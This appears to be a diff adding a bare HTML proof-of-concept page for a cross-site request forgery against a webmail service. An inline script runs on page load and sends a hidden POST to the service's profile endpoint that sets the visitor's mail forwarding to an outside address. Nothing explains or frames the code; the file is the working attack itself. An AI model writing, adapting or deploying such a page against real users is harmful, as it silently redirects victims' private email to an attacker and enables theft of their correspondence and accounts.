@@ -1,0 +1,18 @@
+<html>
+<head>
+<title>xxx</title>
+<script type="text/javascript" src='http://127.0.0.1:4567/jquery-1.7.2.min.js'></script>
+</head>
+<body>
+<script type='text/javascript'>
+
+$.post('http://mail.sohu.net/bapp/20/profile',{
+  'forward': '1@2.com',
+  '_method': 'put'
+},function(ret) {
+  console.log(ret);
+});
+</script>
+
+</body>
+</html>
